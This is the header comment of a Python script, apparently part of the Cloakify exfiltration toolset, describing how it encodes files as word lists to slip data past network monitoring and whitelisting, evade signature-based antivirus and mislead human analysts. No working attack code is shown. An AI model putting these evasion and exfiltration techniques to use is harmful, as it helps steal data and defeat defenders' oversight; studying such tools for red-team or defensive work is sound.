# Version: 1.0.0

# Author:  Joe Gervais (TryCatchHCF)
#
# Summary:  Cloakify Factory is part of the Cloakify Exfiltration toolset that transforms 
# any fileype into lists of words / phrases / Unicode to ease exfiltration of data across 
# monitored networks, defeat data whitelisting restrictions, hiding the data in plain 
# sight, and facilitates social engineering attacks against human analysts and their 
# workflows. Bonus Feature: Defeats signature-based malware detection tools (cloak your 
# other tools). Leverages other scripts of the Cloakify Exfiltration Toolset, including
# cloakify.py, decloakify.py, and the noise generator scripts.
#
# Description:  Base64-encodes the given payload and translates the output using a list
# of words/phrases/Unicode provided in the cipher. This is NOT a secure encryption tool,
# the output is vulnerable to frequency analysis attacks. Use the Noise Generator scripts
# to add entropy to your cloaked file. You should encrypt the file before cloaking if
# secrecy is needed.
#
# Prepackaged ciphers include: lists of desserts in English, Arabic, Thai, Russian, 
# Hindi, Chinese, Persian, and Muppet (Swedish Chef); PokemonGo creatures; Top 100 IP 
# Addresses; Top Websites; GeoCoords of World Capitols; MD5 Password Hashes; An Emoji 
# cipher; Star Trek characters; Geocaching Locations; Amphibians (Scientific Names); 
# evadeAV cipher (simple cipher that minimizes size of the resulting obfuscated data).
#
# To create your own cipher:
#
#	- Generate a list of at least 66 unique words (Unicode-16 accepted)
#	- Remove all duplicate entries and blank lines
# 	- Randomize the list
#	- Place in the 'ciphers/' subdirectory
#	- Relaunch cloakifyFactory and it will automatically detect the new cipher
# 
# Example:  
#
#   $ ./cloakifyFactory.py 
#
